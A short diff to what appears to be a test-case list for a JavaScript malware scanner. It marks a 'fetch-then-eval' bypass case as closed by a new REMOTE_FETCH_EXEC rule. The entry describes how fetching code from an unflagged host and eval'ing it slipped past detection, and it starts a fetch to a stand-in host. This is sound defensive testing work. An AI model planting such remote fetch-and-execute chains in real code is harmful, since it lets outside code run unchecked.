@@ -68,7 +68,7 @@ module.exports = [
     technique: 'generic-host-fetch-eval-chain',
     severity: 'HIGH',
     expected: 'BLOCK',
-    knownBypass: true,
+    knownBypass: false, // closed: REMOTE_FETCH_EXEC rule (Phase 2)
     description: 'Fetches from a non-flagged host and eval\'s the response. Network egress is not chained with eval in any behavioral rule, and the host is not a known-bad literal — slips past as OBSERVE.',
     code: `
       fetch('https://cdn.jsdelivr-mirror.example/a.js')
